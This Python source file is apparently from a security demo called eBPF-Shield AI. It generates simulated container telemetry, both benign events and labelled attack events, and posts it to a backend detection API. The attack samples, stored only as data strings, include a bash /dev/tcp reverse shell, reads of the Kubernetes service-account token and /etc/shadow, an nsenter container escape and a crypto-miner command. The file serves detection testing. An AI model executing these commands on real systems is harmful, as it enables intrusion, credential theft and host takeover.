"""
collector_service.py — Containerized Telemetry Collector for eBPF-Shield AI.

Runs as a Docker service that continuously sends realistic replay events
to the backend API. Clearly labels all events as source="replay".

Modes:
  DEMO_REPLAY_MODE: Generates structured security telemetry events
  LIVE_EBPF_MODE:   (Future) Collect actual kernel telemetry via eBPF

Environment Variables:
  COLLECTOR_MODE:     replay (default) | ebpf
  COLLECTOR_INTERVAL: Seconds between event batches (default: 5)
  BACKEND_URL:        Backend API base URL (default: http://backend:8000)
"""

import os
import sys
import time
import random
import httpx
import json

BACKEND_URL = os.environ.get("BACKEND_URL", "http://backend:8000")
COLLECTOR_MODE = os.environ.get("COLLECTOR_MODE", "replay").upper()
COLLECTOR_INTERVAL = int(os.environ.get("COLLECTOR_INTERVAL", "5"))
API_URL = f"{BACKEND_URL}/api/v1/events/batch"


# ──────────────────────────────────────────────
# Container workload simulation data
# ──────────────────────────────────────────────

CONTAINER_WORKLOADS = [
    {
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
    },
    {
        "container_id": "b2c3d4e5f6a1",
        "pod_name": "api-server-5c8d7e6f3-m9n2p",
        "namespace": "production",
        "node_name": "node-01",
        "image": "python:3.12-slim",
    },
    {
        "container_id": "c3d4e5f6a1b2",
        "pod_name": "payment-svc-4b7c8d9e2-k3l5n",
        "namespace": "production",
        "node_name": "node-02",
        "image": "node:20-alpine",
    },
    {
        "container_id": "d4e5f6a1b2c3",
        "pod_name": "cache-redis-0",
        "namespace": "production",
        "node_name": "node-02",
        "image": "redis:7-alpine",
    },
    {
        "container_id": "e5f6a1b2c3d4",
        "pod_name": "monitoring-agent-8k4j2",
        "namespace": "monitoring",
        "node_name": "node-03",
        "image": "prometheus:v2.48",
    },
]

NORMAL_PROCESSES = [
    {"executable": "/usr/sbin/nginx", "args": "nginx: worker process", "uid": 33},
    {"executable": "/usr/local/bin/python3", "args": "python3 app.py", "uid": 1000},
    {"executable": "/usr/local/bin/node", "args": "node server.js", "uid": 1000},
    {"executable": "/usr/bin/redis-server", "args": "redis-server *:6379", "uid": 999},
    {"executable": "/usr/sbin/nginx", "args": "nginx: master process", "uid": 0},
    {"executable": "/usr/bin/python3", "args": "gunicorn -w 4 main:app", "uid": 1000},
    {"executable": "/usr/local/bin/node", "args": "node worker.js", "uid": 1000},
    {"executable": "/usr/bin/pg_dump", "args": "pg_dump -Fc mydb", "uid": 999},
]

NORMAL_FILES = [
    {"executable": "/usr/sbin/nginx", "args": "/etc/nginx/nginx.conf", "uid": 33},
    {"executable": "/usr/local/bin/node", "args": "/app/config/database.json", "uid": 1000},
    {"executable": "/usr/bin/python3", "args": "/app/settings.py", "uid": 1000},
    {"executable": "/usr/bin/redis-server", "args": "/etc/redis/redis.conf", "uid": 999},
    {"executable": "/usr/local/bin/node", "args": "/app/package.json", "uid": 1000},
    {"executable": "/usr/sbin/nginx", "args": "/var/log/nginx/access.log", "uid": 33},
]

NORMAL_NETWORK = [
    {"executable": "/usr/bin/python3", "args": "connect 10.96.0.1:443", "uid": 1000},
    {"executable": "/usr/local/bin/node", "args": "connect 10.96.5.10:5432", "uid": 1000},
    {"executable": "/usr/local/bin/node", "args": "connect 10.96.3.8:6379", "uid": 1000},
    {"executable": "/usr/bin/python3", "args": "connect 10.96.0.1:80", "uid": 1000},
    {"executable": "/usr/sbin/nginx", "args": "accept 0.0.0.0:80", "uid": 33},
]

ATTACK_SCENARIOS = [
    # Container escape via nsenter
    {
        "event_type": "process_exec",
        "executable": "/usr/bin/nsenter",
        "args": "nsenter --target 1 --mount --uts --ipc --net --pid",
        "uid": 0,
        "container_id": "e5f6a1b2c3d4",
        "pod_name": "compromised-app-8f7e6d5c4-q1w2e",
        "namespace": "staging",
        "node_name": "node-01",
        "image": "vulnerable-app:latest",
    },
    # Credential theft
    {
        "event_type": "file_open",
        "executable": "/bin/cat",
        "args": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "uid": 0,
        "container_id": "e5f6a1b2c3d4",
        "pod_name": "compromised-app-8f7e6d5c4-q1w2e",
        "namespace": "staging",
        "node_name": "node-01",
        "image": "vulnerable-app:latest",
    },
    # Reverse shell
    {
        "event_type": "process_exec",
        "executable": "/bin/bash",
        "args": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
        "uid": 0,
        "container_id": "e5f6a1b2c3d4",
        "pod_name": "compromised-app-8f7e6d5c4-q1w2e",
        "namespace": "staging",
        "node_name": "node-01",
        "image": "vulnerable-app:latest",
    },
    # Crypto mining
    {
        "event_type": "process_exec",
        "executable": "/tmp/xmrig",
        "args": "xmrig --donate-level 1 -o stratum+tcp://pool.mining.com:3333 -u wallet123",
        "uid": 0,
        "container_id": "f6a1b2c3d4e5",
        "pod_name": "data-processor-3a4b5c6d7-r8s9t",
        "namespace": "batch",
        "node_name": "node-03",
        "image": "data-processor:v2.1",
    },
    # C2 connection
    {
        "event_type": "net_connect",
        "executable": "/tmp/xmrig",
        "args": "connect 185.220.101.42:4444",
        "uid": 0,
        "container_id": "f6a1b2c3d4e5",
        "pod_name": "data-processor-3a4b5c6d7-r8s9t",
        "namespace": "batch",
        "node_name": "node-03",
        "image": "data-processor:v2.1",
    },
    # Reconnaissance
    {
        "event_type": "process_exec",
        "executable": "/usr/bin/nmap",
        "args": "nmap -sS 10.96.0.0/16",
        "uid": 0,
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
    },
    # Privilege escalation
    {
        "event_type": "process_exec",
        "executable": "/usr/bin/sudo",
        "args": "sudo -i",
        "uid": 1000,
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
    },
    # Shadow file access
    {
        "event_type": "file_open",
        "executable": "/bin/cat",
        "args": "cat /etc/shadow",
        "uid": 0,
        "container_id": "a1b2c3d4e5f6",
        "pod_name": "web-frontend-7d9f8b6c4-x2k5m",
        "namespace": "production",
        "node_name": "node-01",
        "image": "nginx:1.25-alpine",
    },
]


def generate_normal_event() -> dict:
    """Generate a realistic normal container event."""
    workload = random.choice(CONTAINER_WORKLOADS)
    event_type = random.choices(
        ["process_exec", "file_open", "net_connect"],
        weights=[0.5, 0.3, 0.2]
    )[0]

    if event_type == "process_exec":
        proc = random.choice(NORMAL_PROCESSES)
    elif event_type == "file_open":
        proc = random.choice(NORMAL_FILES)
    else:
        proc = random.choice(NORMAL_NETWORK)

    return {
        "event_type": event_type,
        "pid": random.randint(1000, 30000),
        "ppid": random.randint(1, 1000),
        "executable": proc["executable"],
        "args": proc["args"],
        "uid": proc["uid"],
        "container_id": workload["container_id"],
        "pod_name": workload["pod_name"],
        "namespace": workload["namespace"],
        "node_name": workload["node_name"],
        "image": workload["image"],
        "source": "replay",
        "raw_data": {},
    }


def generate_attack_event() -> dict:
    """Generate a realistic attack scenario event."""
    attack = random.choice(ATTACK_SCENARIOS)
    return {
        "event_type": attack["event_type"],
        "pid": random.randint(5000, 9999),
        "ppid": random.randint(1, 100),
        "executable": attack["executable"],
        "args": attack["args"],
        "uid": attack["uid"],
        "container_id": attack["container_id"],
        "pod_name": attack["pod_name"],
        "namespace": attack["namespace"],
        "node_name": attack["node_name"],
        "image": attack["image"],
        "source": "replay",
        "raw_data": {},
    }


def send_events(events: list):
    """Send events to the backend API."""
    try:
        with httpx.Client(timeout=10) as client:
            resp = client.post(API_URL, json={"events": events})
            data = resp.json()
            alerts = data.get("alerts_created", 0)
            status = "🚨 ALERT" if alerts > 0 else "✅ OK"
            print(f"  {status}  Sent {len(events)} events | Alerts: {alerts}")
            return data
    except Exception as e:
        print(f"  ❌ Error sending events: {e}")
        return None


def wait_for_backend():
    """Wait for the backend to become available."""
    print("⏳ Waiting for backend to become available...")
    max_retries = 60
    for i in range(max_retries):
        try:
            with httpx.Client(timeout=5) as client:
                resp = client.get(f"{BACKEND_URL}/api/v1/health")
                if resp.status_code == 200:
                    print("✅ Backend is ready!")
                    return True
        except Exception:
            pass
        time.sleep(2)
        if (i + 1) % 5 == 0:
            print(f"  Still waiting... ({i + 1}/{max_retries})")
    print("❌ Backend did not become available")
    return False


def run_replay_collector():
    """
    Run the DEMO_REPLAY_MODE collector.
    Sends a mix of normal and attack events continuously.
    """
    print("=" * 60)
    print("  eBPF-Shield AI — Telemetry Collector")
    print(f"  Mode: DEMO_REPLAY_MODE")
    print(f"  ⚠️  All events are REPLAYED samples, not live kernel data")
    print(f"  Interval: {COLLECTOR_INTERVAL}s between batches")
    print(f"  Backend: {BACKEND_URL}")
    print("=" * 60)

    if not wait_for_backend():
        sys.exit(1)

    # Phase 1: Initial burst of normal events to populate the dashboard
    print("\n📡 Phase 1: Sending initial normal workload events...")
    initial_events = [generate_normal_event() for _ in range(10)]
    send_events(initial_events)
    time.sleep(2)

    # Phase 2: Send first batch of attack events
    print("\n🔴 Phase 2: Sending attack scenario events...")
    for attack in ATTACK_SCENARIOS[:4]:
        event = {
            "event_type": attack["event_type"],
            "pid": random.randint(5000, 9999),
            "ppid": random.randint(1, 100),
            "executable": attack["executable"],
            "args": attack["args"],
            "uid": attack["uid"],
            "container_id": attack["container_id"],
            "pod_name": attack["pod_name"],
            "namespace": attack["namespace"],
            "node_name": attack["node_name"],
            "image": attack["image"],
            "source": "replay",
            "raw_data": {},
        }
        send_events([event])
        time.sleep(1)

    # Phase 3: Continuous mixed telemetry
    print(f"\n📡 Phase 3: Continuous telemetry (every {COLLECTOR_INTERVAL}s)...")
    cycle = 0
    while True:
        cycle += 1
        events = []

        # Generate 2-5 normal events per cycle
        num_normal = random.randint(2, 5)
        for _ in range(num_normal):
            events.append(generate_normal_event())

        # Every 4th cycle, include an attack event
        if cycle % 4 == 0:
            events.append(generate_attack_event())
            print(f"\n🔴 Cycle {cycle}: Including attack event in batch")
        else:
            print(f"\n📡 Cycle {cycle}: Normal telemetry batch")

        send_events(events)
        time.sleep(COLLECTOR_INTERVAL)


if __name__ == "__main__":
    if COLLECTOR_MODE == "REPLAY":
        run_replay_collector()
    else:
        print(f"⚠️ LIVE_EBPF_MODE requires Linux kernel with BPF support.")
        print(f"   Falling back to DEMO_REPLAY_MODE...")
        run_replay_collector()
